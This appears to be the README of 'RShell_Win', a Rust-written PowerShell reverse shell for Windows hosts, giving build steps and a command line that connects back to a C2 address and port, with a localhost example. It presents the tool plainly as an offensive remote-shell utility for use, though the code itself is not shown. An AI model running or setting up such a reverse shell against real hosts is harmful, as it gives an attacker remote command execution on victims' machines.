# RShell_Win

#### Simple (powershell) reverse shell for Windows hosts, written entirely in Rust's standard library.

### Build

- Execute `build.bat` to compile the project

### Syntax

```
target\release\rshell_win.exe <c2_address> <c2_port>
```

- Connect to local server port 5003

```
target\release\rshell_win.exe localhost 5003
```